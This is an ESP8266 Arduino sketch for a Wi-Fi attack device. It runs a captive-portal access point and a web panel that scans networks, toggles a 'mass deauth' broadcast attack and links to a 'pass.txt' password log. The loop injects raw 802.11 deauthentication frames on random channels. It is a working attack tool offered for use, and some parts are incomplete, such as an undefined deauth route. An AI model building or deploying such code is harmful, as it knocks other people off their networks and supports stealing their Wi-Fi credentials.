#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include "web.h"

extern "C" { #include "user_interface.h" }

ESP8266WebServer server(80);
DNSServer dnsServer;
bool massOn = false;

void setup() {
  LittleFS.begin();
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("GMpro2", "12345678", 1, 0); //
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", []() {
    String s = FPSTR(Head);
    s += "<div class='card'><div class='card-t'>WIFI SCANNER</div><table><thead><tr><th>SSID</th><th>CH</th><th>USR</th><th>%</th><th>SEL</th></tr></thead><tbody id='sc'></tbody></table></div>";
    s += "<div class='grid'><button onclick=\"tgl(this,'/t_deauth')\">DEAUTH</button><button onclick=\"tgl(this,'/t_mass')\">MASS DEAUTH RUSUH</button></div>";
    s += FPSTR(Mid);
    s += "<div class='card'><div class='card-t'>LOGS</div><button onclick=\"location.href='/pass.txt'\">VIEW PASS.TXT</button></div>";
    s += FPSTR(Foot);
    server.send(200, "text/html", s);
  });

  server.on("/t_mass", [](){ massOn = !massOn; server.send(200, "text/plain", massOn ? "ON" : "OFF"); });
  server.on("/get_scan", [](){
    int n = WiFi.scanNetworks();
    String j = "[";
    for (int i=0; i<n; i++) {
      j += "{\"s\":\""+WiFi.SSID(i)+"\",\"c\":"+String(WiFi.channel(i))+",\"r\":"+String(100+WiFi.RSSI(i))+",\"m\":\""+WiFi.BSSIDstr(i)+"\"}";
      if(i<n-1) j += ",";
    }
    j += "]"; server.send(200, "application/json", j);
  });
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  if(massOn) {
    uint8_t pk[26] = {0xc0,0x00,0x3a,0x01,0xff,0xff,0xff,0xff,0xff,0xff,0x11,0x22,0x33,0x44,0x55,0x66,0x11,0x22,0x33,0x44,0x55,0x66,0x00,0x00,0x01,0x00};
    wifi_set_channel(random(1,13));
    wifi_send_pkt_freedom(pk, 26, 0);
    yield();
  }
}
